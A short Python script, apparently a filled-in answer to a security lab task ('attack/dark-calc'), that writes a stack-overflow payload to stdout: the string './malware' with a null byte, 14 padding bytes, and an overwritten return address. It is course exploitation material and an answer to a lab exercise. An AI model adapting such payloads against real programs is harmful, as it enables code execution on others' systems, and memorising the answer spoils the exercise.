#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = b"./malware\x00" + b"A"*14 + b"\x6b\x1a\x40\x00\x00\x00\x00\x00"

sys.stdout.buffer.write(payload)
